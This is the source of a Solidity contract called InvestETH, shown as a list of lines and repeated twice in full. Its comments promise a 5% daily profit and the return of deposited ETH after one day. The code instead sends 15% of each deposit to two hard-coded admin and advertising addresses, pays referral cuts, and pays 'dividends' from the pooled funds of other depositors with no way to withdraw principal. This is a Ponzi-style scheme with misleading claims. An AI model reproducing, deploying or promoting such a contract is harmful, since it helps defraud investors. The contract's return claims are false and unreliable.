['// Invest ETH \n', '// 5% Profit/days\n', '\n', '// How to INVEST ETH and Get 5% Profit/days ?\n', '\n', '//Send ETH to Contract 0x6d74D4Bf725D296CA3A8eF806bFf40488E72C51d\n', '\n', '//1 day after successfully sending eth to the contract will receive your eth again and 5% as profit\n', '\n', '\n', 'pragma solidity ^0.4.25;\n', '\n', 'library SafeMath {\n', '  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    if (_a == 0) {\n', '      return 0;\n', '    }\n', '    c = _a * _b;\n', '    assert(c / _a == _b);\n', '    return c;\n', '  }\n', '\n', '  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    return _a / _b;\n', '  }\n', '\n', '  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    assert(_b <= _a);\n', '    return _a - _b;\n', '  }\n', '\n', '  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    c = _a + _b;\n', '    assert(c >= _a);\n', '    return c;\n', '  }\n', '}\n', '\n', 'contract InvestETH {\n', '\tusing SafeMath for uint256;\n', '\n', '\taddress public constant admAddress = 0x5df65e16d6EC1a8090ffa11c8185AD372A8786Cd;\n', '\taddress public constant advAddress = 0x670b45f2A8722bF0c01927cf4480fE17d8643fAa;\n', '\n', '\tmapping (address => uint256) deposited;\n', '\tmapping (address => uint256) withdrew;\n', '\tmapping (address => uint256) refearned;\n', '\tmapping (address => uint256) blocklock;\n', '\n', '\tuint256 public totalDepositedWei = 0;\n', '\tuint256 public totalWithdrewWei = 0;\n', '\n', '\tfunction() payable external {\n', '\t\tuint256 admRefPerc = msg.value.mul(5).div(100);\n', '\t\tuint256 advPerc = msg.value.mul(10).div(100);\n', '\n', '\t\tadvAddress.transfer(advPerc);\n', '\t\tadmAddress.transfer(admRefPerc);\n', '\n', '\t\tif (deposited[msg.sender] != 0) {\n', '\t\t\taddress investor = msg.sender;\n', '\t\t\tuint256 depositsPercents = deposited[msg.sender].mul(4).div(100).mul(block.number-blocklock[msg.sender]).div(5900);\n', '\t\t\tinvestor.transfer(depositsPercents);\n', '\n', '\t\t\twithdrew[msg.sender] += depositsPercents;\n', '\t\t\ttotalWithdrewWei = totalWithdrewWei.add(depositsPercents);\n', '\t\t}\n', '\n', '\t\taddress referrer = bytesToAddress(msg.data);\n', '\t\tif (referrer > 0x0 && referrer != msg.sender) {\n', '\t\t\treferrer.transfer(admRefPerc);\n', '\n', '\t\t\trefearned[referrer] += admRefPerc;\n', '\t\t}\n', '\n', '\t\tblocklock[msg.sender] = block.number;\n', '\t\tdeposited[msg.sender] += msg.value;\n', '\n', '\t\ttotalDepositedWei = totalDepositedWei.add(msg.value);\n', '\t}\n', '\n', '\tfunction userDepositedWei(address _address) public view returns (uint256) {\n', '\t\treturn deposited[_address];\n', '    }\n', '\n', '\tfunction userWithdrewWei(address _address) public view returns (uint256) {\n', '\t\treturn withdrew[_address];\n', '    }\n', '\n', '\tfunction userDividendsWei(address _address) public view returns (uint256) {\n', '\t\treturn deposited[_address].mul(4).div(100).mul(block.number-blocklock[_address]).div(5900);\n', '    }\n', '\n', '\tfunction userReferralsWei(address _address) public view returns (uint256) {\n', '\t\treturn refearned[_address];\n', '    }\n', '\n', '\tfunction bytesToAddress(bytes bys) private pure returns (address addr) {\n', '\t\tassembly {\n', '\t\t\taddr := mload(add(bys, 20))\n', '\t\t}\n', '\t}\n', '}']
['// Invest ETH \n', '// 5% Profit/days\n', '\n', '// How to INVEST ETH and Get 5% Profit/days ?\n', '\n', '//Send ETH to Contract 0x6d74D4Bf725D296CA3A8eF806bFf40488E72C51d\n', '\n', '//1 day after successfully sending eth to the contract will receive your eth again and 5% as profit\n', '\n', '\n', 'pragma solidity ^0.4.25;\n', '\n', 'library SafeMath {\n', '  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    if (_a == 0) {\n', '      return 0;\n', '    }\n', '    c = _a * _b;\n', '    assert(c / _a == _b);\n', '    return c;\n', '  }\n', '\n', '  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    return _a / _b;\n', '  }\n', '\n', '  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    assert(_b <= _a);\n', '    return _a - _b;\n', '  }\n', '\n', '  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    c = _a + _b;\n', '    assert(c >= _a);\n', '    return c;\n', '  }\n', '}\n', '\n', 'contract InvestETH {\n', '\tusing SafeMath for uint256;\n', '\n', '\taddress public constant admAddress = 0x5df65e16d6EC1a8090ffa11c8185AD372A8786Cd;\n', '\taddress public constant advAddress = 0x670b45f2A8722bF0c01927cf4480fE17d8643fAa;\n', '\n', '\tmapping (address => uint256) deposited;\n', '\tmapping (address => uint256) withdrew;\n', '\tmapping (address => uint256) refearned;\n', '\tmapping (address => uint256) blocklock;\n', '\n', '\tuint256 public totalDepositedWei = 0;\n', '\tuint256 public totalWithdrewWei = 0;\n', '\n', '\tfunction() payable external {\n', '\t\tuint256 admRefPerc = msg.value.mul(5).div(100);\n', '\t\tuint256 advPerc = msg.value.mul(10).div(100);\n', '\n', '\t\tadvAddress.transfer(advPerc);\n', '\t\tadmAddress.transfer(admRefPerc);\n', '\n', '\t\tif (deposited[msg.sender] != 0) {\n', '\t\t\taddress investor = msg.sender;\n', '\t\t\tuint256 depositsPercents = deposited[msg.sender].mul(4).div(100).mul(block.number-blocklock[msg.sender]).div(5900);\n', '\t\t\tinvestor.transfer(depositsPercents);\n', '\n', '\t\t\twithdrew[msg.sender] += depositsPercents;\n', '\t\t\ttotalWithdrewWei = totalWithdrewWei.add(depositsPercents);\n', '\t\t}\n', '\n', '\t\taddress referrer = bytesToAddress(msg.data);\n', '\t\tif (referrer > 0x0 && referrer != msg.sender) {\n', '\t\t\treferrer.transfer(admRefPerc);\n', '\n', '\t\t\trefearned[referrer] += admRefPerc;\n', '\t\t}\n', '\n', '\t\tblocklock[msg.sender] = block.number;\n', '\t\tdeposited[msg.sender] += msg.value;\n', '\n', '\t\ttotalDepositedWei = totalDepositedWei.add(msg.value);\n', '\t}\n', '\n', '\tfunction userDepositedWei(address _address) public view returns (uint256) {\n', '\t\treturn deposited[_address];\n', '    }\n', '\n', '\tfunction userWithdrewWei(address _address) public view returns (uint256) {\n', '\t\treturn withdrew[_address];\n', '    }\n', '\n', '\tfunction userDividendsWei(address _address) public view returns (uint256) {\n', '\t\treturn deposited[_address].mul(4).div(100).mul(block.number-blocklock[_address]).div(5900);\n', '    }\n', '\n', '\tfunction userReferralsWei(address _address) public view returns (uint256) {\n', '\t\treturn refearned[_address];\n', '    }\n', '\n', '\tfunction bytesToAddress(bytes bys) private pure returns (address addr) {\n', '\t\tassembly {\n', '\t\t\taddr := mload(add(bys, 20))\n', '\t\t}\n', '\t}\n', '}']